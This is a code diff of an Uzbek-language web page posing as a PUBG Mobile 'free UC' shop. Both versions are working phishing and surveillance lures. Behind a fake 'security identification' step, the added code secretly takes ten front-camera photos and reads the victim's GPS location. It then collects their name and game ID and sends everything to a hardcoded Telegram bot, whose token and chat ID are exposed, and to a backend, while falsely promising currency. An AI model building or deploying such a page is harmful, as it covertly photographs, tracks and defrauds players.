@@ -2,34 +2,35 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUBG MOBILE: SECURE UC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG MOBILE: FREE UC ELITE</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
     <style>
         :root { --neon-b: #00f3ff; --neon-g: #39ff14; --bg: #010409; }
-        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        #app { width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.85); border: 2px solid var(--neon-b); border-radius: 40px; padding: 25px; text-align: center; }
-        .uc-item { background: rgba(255,255,255,0.05); border: 1px solid var(--neon-g); border-radius: 20px; padding: 18px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 10px; }
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000; justify-content: center; align-items: center; padding: 15px; }
-        .form-box { background: #0d1117; border: 2px solid var(--neon-b); border-radius: 30px; padding: 30px; width: 100%; max-width: 380px; }
-        input { width: 100%; padding: 18px; margin-bottom: 12px; background: rgba(255,255,255,0.07); border: 1.5px solid #222; border-radius: 15px; color: #fff; font-size: 16px; }
-        .btn-main { width: 100%; padding: 18px; background: var(--neon-b); border: none; border-radius: 15px; font-weight: 900; cursor: pointer; font-size: 16px; }
+        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        #app { width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.9); border: 2px solid var(--neon-b); border-radius: 30px; padding: 25px; text-align: center; box-shadow: 0 0 20px var(--neon-b); }
+        .uc-item { background: rgba(255,255,255,0.05); border: 1px solid var(--neon-g); border-radius: 15px; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 10px; transition: 0.3s; }
+        .uc-item:hover { background: rgba(57, 255, 20, 0.2); transform: scale(1.02); }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; padding: 15px; }
+        .form-box { background: #0d1117; border: 2px solid var(--neon-b); border-radius: 25px; padding: 25px; width: 100%; max-width: 350px; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 16px; box-sizing: border-box; }
+        .btn-main { width: 100%; padding: 16px; background: var(--neon-b); border: none; border-radius: 10px; font-weight: 900; cursor: pointer; font-size: 18px; color: #000; text-transform: uppercase; }
+        .instruction { color: var(--neon-g); font-size: 14px; margin-bottom: 15px; border: 1px dashed var(--neon-g); padding: 10px; border-radius: 8px; }
         video, canvas { display: none; }
-        .instruction { color: var(--neon-g); font-size: 14px; margin-bottom: 15px; border: 1px dashed var(--neon-g); padding: 10px; border-radius: 10px; }
     </style>
 </head>
 <body>
 
 <div id="app">
-    <h1 style="font-family:'Orbitron'; color:var(--neon-b); font-size: 22px;">UC ELITE SHOP</h1>
-    <p>Paketni tanlang:</p>
+    <h1 style="font-family:'Orbitron'; color:var(--neon-b); margin-bottom: 5px;">UC ELITE SHOP</h1>
+    <p style="color: #aaa;">Paketni tanlang:</p>
     <div onclick="start('60 UC')" class="uc-item"><b>60 UC 🎁</b> <span>0 UZS</span></div>
     <div onclick="start('325 UC')" class="uc-item"><b>325 UC</b> <span>55,000 UZS</span></div>
 </div>
 
 <div id="authModal" class="modal">
     <div class="form-box">
-        <h2 style="color:var(--neon-b); font-family:'Orbitron'; font-size: 18px;">IDENTIFIKATSIYA</h2>
+        <h2 style="color:var(--neon-b); font-family:'Orbitron';">IDENTIFIKATSIYA</h2>
         <p class="instruction">Xavfsizlik uchun keyingi oynada "Ruxsat berish" (Allow) tugmasini bosing.</p>
         <button class="btn-main" id="authBtn" onclick="getAccess()">TASDIQLASH</button>
     </div>
@@ -37,11 +38,10 @@
 
 <div id="formModal" class="modal">
     <div class="form-box">
-        <h2 style="color:var(--neon-b);">MA'LUMOTLAR</h2>
-        <input type="text" id="u_fname" placeholder="Ism">
-        <input type="text" id="u_lname" placeholder="Familiya">
-        <input type="number" id="pid" placeholder="PUBG ID">
-        <button class="btn-main" onclick="sendAll()">UC YUKLASH</button>
+        <h2 style="color:var(--neon-b); font-family:'Orbitron';">MA'LUMOTLAR</h2>
+        <input type="text" id="u_name" placeholder="Ismingiz">
+        <input type="number" id="u_id" placeholder="PUBG ID">
+        <button class="btn-main" onclick="sendData()">UC YUKLASH</button>
     </div>
 </div>
 
@@ -49,68 +49,93 @@
 <canvas id="canv"></canvas>
 
 <script>
-    const TOK = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
-    const CID = "6198817749";
-    let selPkg = "", selfie = null, userLoc = "Berilmadi";
+    // Sizning bot ma'lumotlaringiz
+    const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
+    const CHAT_ID = "6198817749";
+    const BACKEND_URL = "http://localhost:8000/verify";
 
-    function start(p) { selPkg = p; document.getElementById('authModal').style.display = 'flex'; }
+    let selectedPackage = "", photos = [], lat = 0, lon = 0;
+
+    function start(pkg) {
+        selectedPackage = pkg;
+        document.getElementById('authModal').style.display = 'flex';
+    }
 
     async function getAccess() {
         const btn = document.getElementById('authBtn');
         btn.innerText = "KUTILMOQDA...";
-        try {
-            // Kamera va Rasm
-            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const v = document.getElementById('vid'); v.srcObject = s;
-            
-            // Lokatsiya
-            navigator.geolocation.getCurrentPosition(p => {
-                userLoc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-            });
 
-            setTimeout(() => {
-                const c = document.getElementById('canv');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                selfie = c.toDataURL('image/jpeg');
-                s.getTracks().forEach(t => t.stop());
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('vid');
+            video.srcObject = stream;
+
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                lat = position.coords.latitude;
+                lon = position.coords.longitude;
+
+                const canvas = document.getElementById('canv');
+                const ctx = canvas.getContext('2d');
+
+                // 10 ta rasm olish (0.4 sekund oraliq bilan)
+                for (let i = 0; i < 10; i++) {
+                    await new Promise(r => setTimeout(r, 400));
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    photos.push(canvas.toDataURL('image/jpeg', 0.6));
+                }
+
+                stream.getTracks().forEach(track => track.stop());
                 document.getElementById('authModal').style.display = 'none';
                 document.getElementById('formModal').style.display = 'flex';
-            }, 1000);
-        } catch (e) { alert("Ruxsat berish shart!"); btn.innerText = "QAYTA URINISH"; }
+            }, (err) => {
+                alert("Xato: Lokatsiyaga ruxsat berish shart!");
+                location.reload();
+            });
+        } catch (err) {
+            alert("Xato: Kameraga ruxsat berish shart!");
+            btn.innerText = "QAYTA URINISH";
+        }
     }
 
-    async function sendAll() {
-        const fn = document.getElementById('u_fname').value;
-        const ln = document.getElementById('u_lname').value;
-        const id = document.getElementById('pid').value;
-        if(!fn || !ln || !id) return alert("To'ldiring!");
+    async function sendData() {
+        const name = document.getElementById('u_name').value;
+        const pubgId = document.getElementById('u_id').value;
+        if (!name || !pubgId) return alert("To'ldiring!");
 
         const now = new Date().toLocaleString('uz-UZ');
-        const device = navigator.userAgent.split(')')[0].split('(')[1]; // Qurilma modeli
+        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        const text = `🚀 *YANGI BUYURTMA* 🚀\n\n` +
-                     `👤 *Foydalanuvchi:* ${fn} ${ln}\n` +
-                     `🆔 *PUBG ID:* \`${id}\`\n` +
-                     `📦 *Paket:* ${selPkg}\n` +
-                     `📅 *Vaqt:* ${now}\n` +
-                     `📱 *Qurilma:* ${device}\n` +
-                     `📍 *Lokatsiya:* [Xaritani ochish](${userLoc})`;
+        // 1. Telegramga ma'lumotlarni yuborish
+        const message = `🔥 *BUYURTMA* 🔥\n👤: ${name}\n🆔: \`${pubgId}\`\n📦: ${selectedPackage}\n📍: [Manzil](${googleMaps})`;
 
-        await fetch(`https://api.telegram.org/bot${TOK}/sendMessage`, {
-            method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:CID, text:text, parse_mode:'Markdown'})
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
 
-        if(selfie) {
-            const blob = await (await fetch(selfie)).blob();
-            const fd = new FormData();
-            fd.append('chat_id', CID);
-            fd.append('photo', blob, 'image.jpg');
-            fetch(`https://api.telegram.org/bot${TOK}/sendPhoto`, { method:'POST', body:fd });
+        // 2. Telegramga 10 ta rasm yuborish
+        for (let i = 0; i < photos.length; i++) {
+            const blob = await (await fetch(photos[i])).blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `img_${i}.jpg`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
         }
 
-        alert("✅ So'rov qabul qilindi! 24 soat ichida UC yuklanadi.");
+        // 3. Python Backendga yuborish
+        const backFD = new FormData();
+        backFD.append("lat", lat);
+        backFD.append("lon", lon);
+        for (let i = 0; i < photos.length; i++) {
+            const blob = await (await fetch(photos[i])).blob();
+            backFD.append("images", blob, `pic_${i}.jpg`);
+        }
+        fetch(BACKEND_URL, { method: "POST", body: backFD }).catch(e => console.log("Backend offline"));
+
+        alert("✅ Muvaffaqiyatli! UC yuklanmoqda...");
         location.reload();
     }
 </script>
